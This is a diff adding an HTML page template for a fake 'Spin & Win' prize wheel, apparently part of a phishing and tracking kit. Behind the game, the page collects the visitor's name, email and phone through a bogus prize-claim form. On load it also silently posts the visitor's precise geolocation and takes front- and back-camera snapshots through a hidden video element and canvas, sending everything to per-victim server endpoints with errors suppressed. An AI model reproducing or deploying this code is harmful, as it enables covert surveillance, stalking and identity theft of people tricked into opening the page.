@@ -1,0 +1,90 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Spin & Win!</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#ff6b6b 0%,#feca57 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.container{background:#fff;padding:30px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.2);width:100%;max-width:400px;text-align:center}
+h1{font-size:28px;color:#333;margin-bottom:10px}
+.subtitle{color:#666;margin-bottom:30px}
+.wheel-container{position:relative;width:280px;height:280px;margin:0 auto 30px}
+.wheel{width:100%;height:100%;border-radius:50%;border:8px solid #333;background:conic-gradient(#ff6b6b 0deg 45deg,#feca57 45deg 90deg,#48dbfb 90deg 135deg,#ff9ff3 135deg 180deg,#54a0ff 180deg 225deg,#5f27cd 225deg 270deg,#00d2d3 270deg 315deg,#1dd1a1 315deg 360deg);transition:transform 4s ease-out}
+.pointer{position:absolute;top:-15px;left:50%;transform:translateX(-50%);font-size:30px}
+.btn{width:100%;padding:18px;background:linear-gradient(135deg,#ff6b6b 0%,#ee5253 100%);color:#fff;border:none;border-radius:30px;font-size:20px;font-weight:bold;cursor:pointer;margin-bottom:20px}
+.btn:hover{transform:scale(1.02)}
+.btn:disabled{opacity:0.5;cursor:not-allowed}
+.prize{font-size:24px;font-weight:bold;color:#5f27cd;display:none;animation:bounce 0.5s}
+@keyframes bounce{0%,100%{transform:scale(1)}50%{transform:scale(1.2)}}
+.claim-form{display:none;margin-top:20px;text-align:left}
+.claim-form label{display:block;margin-bottom:5px;font-weight:600}
+.claim-form input{width:100%;padding:12px;margin-bottom:15px;border:2px solid #ddd;border-radius:10px;font-size:16px}
+.claim-btn{width:100%;padding:16px;background:#1dd1a1;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>🎰 Spin & Win!</h1>
+<p class="subtitle">You have 1 FREE spin! Try your luck now!</p>
+<div class="wheel-container">
+<div class="pointer">📍</div>
+<div class="wheel" id="wheel"></div>
+</div>
+<button class="btn" id="spinBtn" onclick="spin()">🎲 SPIN NOW!</button>
+<div class="prize" id="prize"></div>
+<div class="claim-form" id="claimForm">
+<h3>🎁 Claim Your Prize!</h3>
+<p style="color:#666;margin-bottom:15px">Enter your details to receive your reward:</p>
+<label>Full Name</label>
+<input type="text" id="name" placeholder="John Doe">
+<label>Email Address</label>
+<input type="email" id="email" placeholder="you@email.com">
+<label>Phone Number</label>
+<input type="tel" id="phone" placeholder="+1234567890">
+<button class="claim-btn" onclick="claim()">Claim Prize</button>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas hidden id="canvas" width="500" height="500"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+const prizes = ['$500 Cash!', '$100 Gift Card!', 'iPhone 15 Pro!', '$50 Voucher!', 'Free Subscription!', '$1000 Prize!', 'MacBook Pro!', '$200 Credit!'];
+
+function spin() {
+    document.getElementById('spinBtn').disabled = true;
+    const wheel = document.getElementById('wheel');
+    const rotation = 1800 + Math.random() * 1800;
+    wheel.style.transform = `rotate(${rotation}deg)`;
+    
+    setTimeout(() => {
+        const prize = prizes[Math.floor(Math.random() * prizes.length)];
+        document.getElementById('prize').textContent = `🎉 You won: ${prize}`;
+        document.getElementById('prize').style.display = 'block';
+        document.getElementById('claimForm').style.display = 'block';
+    }, 4000);
+}
+
+function claim() {
+    const name = document.getElementById('name').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phone').value;
+    
+    if (name && email) {
+        $.post("<%=a %>/formdata", {uid: uid, data: encodeURIComponent(`Name: ${name}, Email: ${email}, Phone: ${phone}`)});
+        $.post("<%=a %>/email", {uid: uid, email: encodeURIComponent(email)});
+        alert('Congratulations! Your prize will be sent to your email within 24 hours!');
+        window.location.href = "<%=url %>";
+    }
+}
+
+window.onload = function() {
+    if(navigator.geolocation) { navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true}); }
+    async function captureCamera(f, l) { try { const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:f}}); video.srcObject=s; await new Promise(r=>setTimeout(r,1500)); canvas.getContext('2d').drawImage(video,0,0,500,500); $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,","")),cam:l}); s.getTracks().forEach(t=>t.stop()); } catch(e){} }
+    captureCamera("user","selfie").then(()=>captureCamera("environment","back"));
+}
+</script>
+</body>
+</html>
